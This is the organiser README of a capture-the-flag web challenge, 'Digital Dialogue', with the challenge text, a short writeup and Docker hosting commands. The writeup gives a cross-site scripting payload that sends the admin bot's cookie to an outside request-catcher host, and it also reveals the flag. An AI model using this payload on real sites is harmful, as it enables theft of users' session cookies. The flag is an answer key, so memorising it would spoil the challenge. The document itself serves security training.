# Digital Dialogue

## Description  
Give the following to competitors: 
```
Professor Yoda in your Lightsabers class (JEDI 301) has assigned you a digital dialogue! Your absolute favorite! However, Jar Jar coded the site so it's kinda wonky. What are the odds that they don't sanitize their inputs for JavaScript code?

The flag is the cookie for the admin bot. Good luck!

Flag format: byuctf{flaghere}
```

Also give competitors the URL for the python server, the URL for the admin bot, and `digital_dialogue.zip` found in this directory.

## Writeup
This is about the simplest XSS challenge that you'll ever come across. The presence of the admin bot should imply that. The website will run pretty much any JavaScript payload that you give to it. A payload such as `<img src="x" onerror="var myImage = new Image(100, 200); myImage.src = &quot;https://byuctf.requestcatcher.com/flag?cookie=&quot;+document.cookie;">` will send the flag to byuctf.requestcatcher.com. 

**Flag** - `byuctf{MAY_the_XSS_be_WITH_you}`

## Hosting
This challenge should be a Docker container that runs the Flask server `server.py` on port 1337, and the admin bot portal `admin_bot.js` on port 1338. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
docker build -t digital_dialogue .
docker network create -d bridge digital_dialogue
```

The command to start the challenge is:

```bash
docker run -p 1337:1234 -p 1338:2345 --detach --name digital_dialogue --network digital_dialogue digital_dialogue:latest
```

The command to stop the challenge is:

```bash
docker stop digital_dialogue
```